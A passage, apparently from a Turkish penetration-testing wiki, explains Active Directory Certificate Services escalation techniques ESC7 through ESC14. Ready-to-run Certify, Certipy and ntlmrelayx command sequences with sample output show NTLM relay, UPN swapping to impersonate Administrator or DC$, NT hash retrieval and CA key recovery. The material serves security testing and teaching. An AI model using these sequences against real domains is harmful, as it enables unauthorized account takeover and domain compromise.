[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 kötüye kullanımlarına (EDITF attributes etkinleştirme veya bekleyen istekleri onaylama) ek olarak, **Certify 2.0**, Enterprise CA üzerinde yalnızca *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren yepyeni bir primitive ortaya çıkardı.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC yöntemi, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Bu yöntem geleneksel olarak meşru CA'lar tarafından **bekleyen** isteklerdeki uzantıları güncellemek için kullanılsa da saldırgan, onay bekleyen bir isteğe **varsayılan olmayan bir sertifika uzantısı** (örneğin `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) **eklemek** için yöntemi kötüye kullanabilir.

Hedeflenen template bu uzantı için **varsayılan bir değer tanımlamadığından**, istek sonunda düzenlendiğinde CA saldırganın kontrolündeki değerin üzerine yazmaz. Bu nedenle ortaya çıkan sertifika, saldırganın seçtiği bir uzantıyı içerir. Bu uzantı şunları sağlayabilir:

* Diğer savunmasız template'lerin Application / Issuance Policy gereksinimlerini karşılayarak ayrıcalık yükseltmeye yol açabilir.
* Üçüncü taraf sistemlerde sertifikaya beklenmedik güven kazandıran ek EKU'lar veya policies enjekte edebilir.

Kısacası, daha önce ESC7'nin “daha az güçlü” kısmı olarak değerlendirilen *Manage Certificates*, artık CA yapılandırmasına dokunmadan veya daha kısıtlayıcı *Manage CA* yetkisini gerektirmeden tam ayrıcalık yükseltme ya da uzun vadeli kalıcılık için kullanılabilir.

#### Certify 2.0 ile primitive'in kötüye kullanılması

1. **Beklemede kalacak bir sertifika isteği gönderin.** Bu, yönetici onayı gerektiren bir template kullanılarak sağlanabilir:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Yeni `manage-ca` komutunu kullanarak bekleyen isteğe özel bir uzantı ekleyin**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Şablon, *Certificate Issuance Policies* uzantısını zaten tanımlamıyorsa, yukarıdaki değer sertifika verildikten sonra korunur.*

3. **İsteği gönderin** (rolünüzde *Manage Certificates* onay hakları da varsa) veya bir operatörün onaylamasını bekleyin. Sertifika verildikten sonra indirin:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Ortaya çıkan sertifika artık kötü amaçlı issuance-policy OID'sini içerir ve sonraki saldırılarda (ör. ESC13, domain yükseltme vb.) kullanılabilir.

> NOT: Aynı saldırı, Certipy ≥ 4.7 ile `ca` komutu ve `-set-extension` parametresi kullanılarak da gerçekleştirilebilir.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

> [!TIP]
> **AD CS'nin kurulu olduğu** ortamlarda, **web enrollment endpoint'i varsa ve güvenlik açığına sahipse** ve **domain bilgisayarlarının kayıt olmasına ve client authentication'a izin veren en az bir certificate template yayımlanmışsa** (varsayılan **`Machine`** template'i gibi), spooler servisi etkin olan **herhangi bir bilgisayar saldırgan tarafından ele geçirilebilir**!

AD CS, yöneticilerin kurabileceği ek sunucu rolleri aracılığıyla kullanılabilen, HTTP tabanlı çeşitli enrollment yöntemlerini destekler. HTTP tabanlı sertifika enrollment arayüzleri **NTLM relay saldırılarına** açıktır. **Ele geçirilmiş bir makineden** saldırgan, gelen NTLM bağlantısıyla kimlik doğrulaması yapan herhangi bir AD hesabını taklit edebilir. Saldırgan, kurban hesabını taklit ederken bu web arayüzlerine erişerek `User` veya `Machine` certificate template'lerini kullanıp client authentication sertifikası **isteyebilir**.

- **Web enrollment arayüzü** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP uygulaması) varsayılan olarak yalnızca HTTP kullanır; bu da NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca Authorization HTTP header'ı üzerinden yalnızca NTLM kimlik doğrulamasına açıkça izin verir; bu nedenle Kerberos gibi daha güvenli kimlik doğrulama yöntemleri kullanılamaz.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES), varsayılan olarak Authorization HTTP header'ı üzerinden negotiate authentication'ı destekler. Negotiate authentication hem Kerberos'u hem de **NTLM'yi destekler**; böylece saldırgan relay saldırıları sırasında kimlik doğrulamayı **NTLM'ye düşürebilir**. Bu web servislerinde varsayılan olarak HTTPS etkin olsa da HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS servislerini NTLM relay saldırılarına karşı korumak, yalnızca HTTPS channel binding ile birlikte kullanıldığında mümkündür. Ne yazık ki AD CS, channel binding için gerekli olan IIS'teki Extended Protection for Authentication'ı etkinleştirmez.<sup>[[6]](#references)</sup>

NTLM relay saldırılarındaki yaygın bir **sorun**, NTLM oturumlarının **kısa süreli olması** ve saldırganın **NTLM signing gerektiren** servislerle etkileşim kuramamasıdır.

Bununla birlikte, kullanıcı adına bir sertifika edinmek için NTLM relay saldırısından yararlanılarak bu sınırlama aşılabilir; çünkü oturumun süresini sertifikanın geçerlilik süresi belirler ve sertifika, **NTLM signing zorunlu kılan** servislerde kullanılabilir. Çalınmış bir sertifikanın nasıl kullanılacağına ilişkin talimatlar için bkz.:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay saldırılarının bir diğer sınırlaması, **kurban hesabının saldırganın kontrolündeki bir makineye kimlik doğrulaması yapması gerekmesidir**. Saldırgan bu kimlik doğrulamayı bekleyebilir veya **zorlamaya** çalışabilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Kötüye Kullanım**

[**Certify**](https://github.com/GhostPack/Certify)’nin `cas` komutu **etkin HTTP AD CS endpoint'lerini** listeler:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Certificate Authority'ler (CA'ler) tarafından Certificate Enrollment Service (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar, **Certutil.exe** aracı kullanılarak ayrıştırılıp listelenebilir:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Kötüye Kullanım

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy) ile kötüye kullanım

Sertifika isteği, varsayılan olarak Certipy tarafından `Machine` veya `User` şablonuna göre yapılır. Hangi şablonun kullanılacağı, relay edilen hesap adının `$` ile bitip bitmediğine göre belirlenir. Alternatif bir şablon belirtmek için `-template` parametresi kullanılabilir.

Ardından, kimlik doğrulamayı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Domain controller'larla çalışırken `-template DomainController` belirtmek gerekir.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Güvenlik Uzantısı Yok - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

ESC9 olarak adlandırılan **`msPKI-Enrollment-Flag`** değerindeki **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`), `szOID_NTDS_CA_SECURITY_EXT` SID uzantısının sertifikaya eklenmemesine neden olur. Eski ESC9 örnekleri, KDC uyumluluk davranışına (`StrongCertificateBindingEnforcement=1`) veya ayrı bir zayıf Schannel eşleme yoluna dayanır. `1` değeri **geçmişe yönelik bir uyumluluk ayarıdır**, mevcut varsayılan değildir: Microsoft, KDC geçersiz kılma ayarının 9 Eylül 2025 tarihli Windows güvenlik güncellemesiyle artık desteklenmediğini belirtiyor. Eski bir yöntemi uygulamadan önce hedefin güncelleme durumunu ve kimlik doğrulama uç noktasını kontrol edin.<sup>[[7]](#references)</sup> Bkz. [Microsoft'un kullanıma sunma kılavuzu](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Bu bayrağın ayarının önem kazandığı koşullar şunlardır:

- Eski ve uyumlu bir KDC'de, etkin sertifika bağlama ilkesi eşlemeye izin verir; alternatif olarak Schannel uç noktası, `CertificateMappingMethods` bit `0x4` aracılığıyla UPN eşlemesini ayrıca etkinleştirir.
- Sertifika, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağıyla işaretlenmiştir.
- Sertifikada herhangi bir istemci kimlik doğrulama EKU'su belirtilmiştir.
- Başka bir hesabı ele geçirmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Kötüye Kullanım Senaryosu

`John@corp.local` kullanıcısının `Jane@corp.local` üzerinde `GenericWrite` izinleri olduğunu ve amacın `Administrator@corp.local` hesabını ele geçirmek olduğunu varsayalım. `Jane@corp.local` kullanıcısının kayıt olma iznine sahip olduğu `ESC9` sertifika şablonunun `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı yapılandırılmıştır.

Başlangıçta, `John` kullanıcısının `GenericWrite` izni sayesinde `Shadow Credentials` kullanılarak `Jane` kullanıcısının hash'i elde edilir:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Daha sonra, `Jane`'in `userPrincipalName` değeri, `@corp.local` etki alanı kısmı bilerek atlanarak `Administrator` olarak değiştirilir:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Bu değişiklik, `Administrator@corp.local`, `Administrator`'ın `userPrincipalName` değerinden farklı kaldığı için kısıtlamaları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenen `ESC9` sertifika şablonu `Jane` olarak istenir:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Sertifikanın `userPrincipalName` değerinin `Administrator`'ı yansıttığı ve herhangi bir “object SID” içermediği not edilir.

Ardından `Jane`'in `userPrincipalName` değeri orijinali olan `Jane@corp.local` olarak geri alınır:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Düzenlenen sertifikayla kimlik doğrulamayı denemek artık `Administrator@corp.local` hesabının NT hash'ini verir. Sertifikada domain belirtilmediğinden komutta `-domain <domain>` bulunmalıdır:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Zayıf Sertifika Eşlemeleri - ESC10

### Açıklama

ESC10 kapsamında genellikle iki ayrı sertifika eşleme ilkesi ele alınır. İlgili kimlik doğrulamayı gerçekten gerçekleştiren uç noktadaki ayarı inceleyin:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki Schannel `CertificateMappingMethods`, uygulama sunucusundaki TLS istemci sertifikası eşlemesini denetler. UPN biti `0x4` değeridir; güncellenmiş sistemlerde varsayılan değer `0x18` (`0x8 | 0x10`) şeklindedir.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki KDC `StrongCertificateBindingEnforcement`, geçmişte Kerberos sertifika bağlama uyumluluğunu denetliyordu. `1` değeri günümüzde güvenilir bir varsayılan değildir ve Microsoft, 9 Eylül 2025 Windows güvenlik güncellemesiyle bu geçersiz kılma ayarına yönelik desteği sonlandırdı. Bu ayarın durumu tek başına Schannel'ın UPN eşlemesini açıklamaz.<sup>[[7]](#references)</sup>

**Durum 1**

Geçmişte, eski bir KDC `StrongCertificateBindingEnforcement=0` ayarını dikkate alıyordu; bu geçersiz kılma ayarı güncel yamalı sistemlerde artık desteklenmediğinden güncelleme düzeyini doğrulayın.

**Durum 2**

Schannel istemci sertifikası uç noktasında `CertificateMappingMethods` UPN biti (`0x4`) etkin olduğunda. Bu, KDC güçlü bağlama zorlamasından ayrı bir ayardır ve yine de kaydedilebilir bir istemci kimlik doğrulama sertifikası ile eşlenen hesap özniteliğinin etkin kontrolünü gerektirir.

### Kötüye Kullanım Durumu 1

KDC'nin hâlâ `StrongCertificateBindingEnforcement=0` ayarını dikkate aldığı eski bir dağıtımda, bir hesabın `userPrincipalName` özniteliği üzerindeki kontrol, başka bir hesaba yönelik zayıf eşleme yolunun bir parçası olabilir. Gerekli sertifika kaydı, eşleme, hedef kimlik ve başarılı kimlik doğrulama ayrı ayrı kontrol edilmelidir; tek başına bir `GenericWrite` ACE'si veya kayıt defteri değeri hesabın ele geçirildiğini göstermez.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan bir saldırgan, `Administrator@corp.local` hesabını ele geçirmeyi hedefler. İşlem ESC9'u izler ve herhangi bir sertifika şablonunun kullanılmasına olanak tanır.

İlk olarak `GenericWrite` yetkisinden yararlanılarak Shadow Credentials aracılığıyla `Jane`'in hash'i elde edilir.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Ardından, kısıtlama ihlalini önlemek için `@corp.local` kısmı bilerek atlanarak `Jane`'in `userPrincipalName` değeri `Administrator` olarak değiştirilir.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Bunun ardından, istemci kimlik doğrulamasını etkinleştiren bir sertifika, varsayılan `User` şablonu kullanılarak `Jane` adına talep edilir.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'in `userPrincipalName` değeri daha sonra orijinal haline, `Jane@corp.local` olarak geri döndürülür.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Elde edilen sertifikayla kimlik doğrulaması, `Administrator@corp.local` hesabının NT hash'ini verir; sertifikada etki alanı bilgileri bulunmadığından komutta etki alanının belirtilmesi gerekir.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Kötüye Kullanım Senaryosu 2

`CertificateMappingMethods`, `UPN` bit bayrağını (`0x4`) içeriyorsa, `GenericWrite` izinlerine sahip A hesabı, `userPrincipalName` özelliği olmayan tüm B hesaplarını; makine hesapları ve yerleşik etki alanı yöneticisi `Administrator` da dahil olmak üzere, ele geçirebilir.

Buradaki amaç, `GenericWrite` izninden yararlanarak önce Shadow Credentials aracılığıyla `Jane`'in hash'ini elde etmek ve ardından `DC$@corp.local` hesabını ele geçirmektir.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane`'in `userPrincipalName` değeri daha sonra `DC$@corp.local` olarak ayarlanır.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Varsayılan `User` şablonu kullanılarak `Jane` adına istemci kimlik doğrulaması sertifikası istenir.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'in `userPrincipalName` değeri bu işlemden sonra orijinal haline döndürülür.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel üzerinden kimlik doğrulaması yapmak için Certipy’nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulamasının başarılı olduğu `u:CORP\DC$` ile belirtilir.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell üzerinden `set_rbcd` gibi komutlar, Resource-Based Constrained Delegation (RBCD) saldırılarını etkinleştirerek etki alanı denetleyicisinin ele geçirilmesine yol açabilir.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Bu güvenlik açığı, `userPrincipalName` değeri olmayan veya bu değer `sAMAccountName` ile eşleşmeyen tüm kullanıcı hesaplarını da kapsar. Varsayılan olarak `userPrincipalName` değeri bulunmayan `Administrator@corp.local` hesabı, yükseltilmiş LDAP ayrıcalıkları nedeniyle öncelikli bir hedeftir.

## NTLM'yi ICPR'ye aktarma - ESC11

### Açıklama

CA Server, `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa RPC hizmeti üzerinden imzalama olmadan NTLM relay saldırıları gerçekleştirilebilir. [Buradaki referans](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`Enforce Encryption for Requests` ayarının devre dışı olup olmadığını belirlemek için `certipy` kullanabilirsiniz. certipy, `ESC11` güvenlik açıklarını gösterir.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Kötüye Kullanım Senaryosu

Bir relay server kurmak gerekir:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Not: DomainController için `-template` belirtmeliyiz.

Veya [sploutchy'nin impacket fork'unu](https://github.com/sploutchy/impacket) kullanarak:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## YubiHSM ile ADCS CA'ya shell erişimi - ESC12

### Açıklama

Yöneticiler, Certificate Authority'yi "Yubico YubiHSM2" gibi harici bir cihazda depolayacak şekilde ayarlayabilir.

USB cihazı CA sunucusuna USB bağlantı noktası üzerinden bağlanmışsa veya CA sunucusu sanal makineyse USB cihaz sunucusu kullanılıyorsa, Key Storage Provider'ın YubiHSM'de anahtar oluşturup kullanabilmesi için bir kimlik doğrulama anahtarı (bazen "parola" olarak anılır) gerekir.

Bu anahtar/parola, kayıt defterinde `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında düz metin olarak saklanır.

[Buradaki](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) referansa bakın.<sup>[[11]](#references)</sup>

### Kötüye Kullanım Senaryosu

Shell erişimi elde ettiğinizde CA'nın özel anahtarı fiziksel bir USB cihazında saklanıyorsa, anahtarı kurtarmak mümkündür.

Öncelikle CA sertifikasını (bu herkese açıktır) edinmeniz gerekir, ardından:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Son olarak, CA sertifikasını ve özel anahtarını kullanarak rastgele yeni bir sertifika oluşturmak için certutil `-sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` özniteliği, sertifika şablonuna bir issuance policy eklenmesini sağlar. Issuance policy'lerden sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID container'ının Configuration Naming Context'inde (CN=OID,CN=Public Key Services,CN=Services) bulunabilir. Bir policy, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir. Böylece sistem, sertifikayı sunan bir kullanıcıyı grup üyesiymiş gibi yetkilendirebilir. [Buradaki referans](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Başka bir deyişle, bir kullanıcı sertifika kaydetme iznine sahipse ve sertifika bir OID grubuna bağlıysa, kullanıcı bu grubun ayrıcalıklarını devralabilir.

OIDToGroupLink'i bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Kötüye Kullanım Senaryosu

`certipy find` veya `Certify.exe find /showAllPermissions` kullanarak bir kullanıcının iznini bulun.

`John`, `VulnerableTemplate` için kayıt iznine sahipse kullanıcı, `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Tek yapması gereken şablonu belirtmektir; OIDToGroupLink haklarına sahip bir sertifika alır.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Explicit Certificate Mapping Abuse — ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama oldukça kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer alıyor.<sup>[[14]](#references)</sup>

ESC14, öncelikle Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` özniteliğinin kötüye kullanılması ya da güvensiz şekilde yapılandırılması yoluyla ortaya çıkan "zayıf açık sertifika eşleme" güvenlik açıklarını ele alır. Çok değerli bu öznitelik, yöneticilerin kimlik doğrulama amacıyla X.509 sertifikalarını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Bu açık eşlemeler tanımlandığında, genellikle sertifikanın SAN alanındaki UPN veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısına gömülü SID'ye dayanan varsayılan sertifika eşleme mantığını geçersiz kılabilir.

`altSecurityIdentities` özniteliğinde bir sertifikayı tanımlamak için kullanılan dize değeri fazla genel olduğunda, kolayca tahmin edilebildiğinde, benzersiz olmayan sertifika alanlarına dayandığında veya kolayca taklit edilebilen sertifika bileşenlerini kullandığında eşleme "zayıf" sayılır. Bir saldırgan, ayrıcalıklı bir hesap için bu şekilde zayıf tanımlanmış açık eşlemeyle eşleşen özniteliklere sahip bir sertifikayı edinebilir veya oluşturabilirse, bu sertifikayı hesap olarak kimlik doğrulaması yapmak ve hesabı taklit etmek için kullanabilir.

Potansiyel olarak zayıf `altSecurityIdentities` eşleme dizelerine örnekler:

- Yalnızca yaygın bir Subject Common Name (CN) üzerinden eşleme: ör. `X509:<S>CN=SomeUser`. Saldırgan bu CN'ye sahip bir sertifikayı daha az güvenli bir kaynaktan edinebilir.
- Belirli bir seri numarası veya subject key identifier gibi ek bir niteleyici olmadan, fazlasıyla genel Issuer Distinguished Name (DN) veya Subject DN kullanmak: ör. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Saldırganın yasal olarak edinebileceği veya oluşturabileceği (bir CA'i ele geçirmişse ya da ESC1'de olduğu gibi savunmasız bir şablon bulmuşsa) bir sertifikada karşılayabileceği, tahmin edilebilir başka örüntüler veya kriptografik olmayan tanımlayıcılar kullanmak.

`altSecurityIdentities` özniteliği eşleme için çeşitli biçimleri destekler. Örneğin:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN üzerinden eşler)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Subject Key Identifier uzantısı değerini kullanarak eşler)
- `X509:<SR>SerialNumberBackedByIssuerDN` (Issuer DN ile örtük olarak nitelenmiş seri numarası üzerinden eşler) - bu standart bir biçim değildir; genellikle `<I>IssuerDN<SR>SerialNumber` kullanılır.
- `X509:<RFC822>EmailAddress` (SAN'deki bir RFC822 adı, genellikle e-posta adresi üzerinden eşler)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın ham public key'inin SHA1 özeti üzerinden eşler - genellikle güçlüdür)

Bu eşlemelerin güvenliği, eşlemede kullanılan tanımlayıcılara bağlıdır. Microsoft, `X509:<RFC822>` dahil olmak üzere e-posta veya subject adlarına dayalı eşlemeleri **zayıf** olarak sınıflandırır. Full Enforcement modunda, güçlü eşlemesi olmayan bir sertifika reddedilir; Eylül 2025 Windows güvenlik güncelleştirmesi Compatibility moduna dönme seçeneğini kaldırmıştır. Bu nedenle, yalnızca zayıf bir eşleme günümüzde güvenilir bir taklit yolu değildir. Zayıf eşleme senaryosunu değerlendirirken etki alanı denetleyicisinin gerçek yama düzeyini ve sertifika eşleme davranışını kontrol edin. `altSecurityIdentities` özniteliğine yazma izni ayrı bir olasılıktır: uygun ve güvenilir bir sertifikaya sahip saldırgan, geçerli izinlere ve sertifika doğrulamasına bağlı olarak **güçlü** bir açık eşleme ekleyebilir. Bkz. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) ve [ESC14 araştırması](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Sertifika kimlik doğrulaması hatalarının da teşhis edilmesi gerekir: hedef hesabın devre dışı bırakılması veya parolanın süresinin dolması, sertifikanın kendisi hâlâ geçerli olsa bile oturum açmayı engelleyebilir.

### Kötüye Kullanım Senaryosu

ESC14, Active Directory'deki (AD) **açık sertifika eşlemelerini**, özellikle de `altSecurityIdentities` özniteliğini hedef alır. Bu öznitelik ayarlanmışsa (tasarım gereği veya yanlış yapılandırma nedeniyle), saldırganlar eşlemeyle eşleşen sertifikaları sunarak hesapları taklit edebilir.

#### Senaryo A: Saldırgan `altSecurityIdentities` Özniteliğine Yazabilir

 **Ön koşul**: Saldırganın hedef hesabın `altSecurityIdentities` özniteliğine yazma izni ya da hedef AD nesnesinde aşağıdaki izinlerden biri aracılığıyla bu izni verme yetkisi vardır:  
- `altSecurityIdentities` üzerinde Write property  
- `Public-Information` üzerinde Write property  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Senaryo B: Hedefte X509RFC822 (E-posta) Üzerinden Zayıf Eşleme Var

- **Geçmişe bağlı/koşullu ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509RFC822 eşlemesi vardır, saldırgan bir sertifika talep edenin `mail` özniteliğini düzenleyebilir ve uygun bir şablon, çakışan bir SID bağlaması olmadan bu e-postayı client-authentication sertifikasına ekler. Kimlik doğrulaması için ayrıca zayıf eşlemeyi hâlâ kabul eden bir ortam gerekir; Full Enforcement, yalnızca zayıf eşlemeye dayalı sertifika eşlemelerini reddeder. Yazılabilir bir `mail` özniteliği tek başına yalnızca bir ipucudur.
#### Senaryo C: Hedefte X509IssuerSubject Eşlemesi Var

- **Ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509IssuerSubject açık eşlemesi vardır. Saldırgan, hedefin X509IssuerSubject eşlemesindeki subject ile eşleşmesi için bir kurban sorumlunun `cn` veya `dNSHostName` özniteliğini ayarlayabilir. Ardından saldırgan kurban olarak sertifika talep edebilir ve bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.
#### Senaryo D: Hedefte X509SubjectOnly Eşlemesi Var

